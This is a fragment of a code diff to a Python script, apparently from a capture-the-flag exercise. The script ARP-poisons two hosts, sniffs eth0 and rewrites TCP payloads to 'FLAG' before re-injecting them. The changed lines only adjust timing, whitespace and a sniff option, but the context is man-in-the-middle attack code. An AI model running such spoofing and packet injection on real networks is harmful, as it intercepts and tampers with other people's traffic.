@@ -503,7 +503,7 @@ def arp_spoof():
 		# print("start poisioning...")
 		arp_poison(ip1,ip2)
 		arp_poison(ip2,ip1)
-		time.sleep(2)
+		time.sleep(1)
 
 def process_packet(packet):
 	if IP in packet:
@@ -526,6 +526,7 @@ def process_packet(packet):
 						packet[Raw].load = b"FLAG\n"
 						del packet[IP].chksum
 						del packet[TCP].chksum
+						
 						send(packet,iface="eth0")
 						print("send!")	
 						packet.show()
@@ -537,5 +538,5 @@ def process_packet(packet):
 arp_thread=threading.Thread(target=arp_spoof)
 arp_thread.start()
 
-sniff(prn=process_packet,iface="eth0")
+sniff(prn=process_packet,iface="eth0",store=0)
 ```
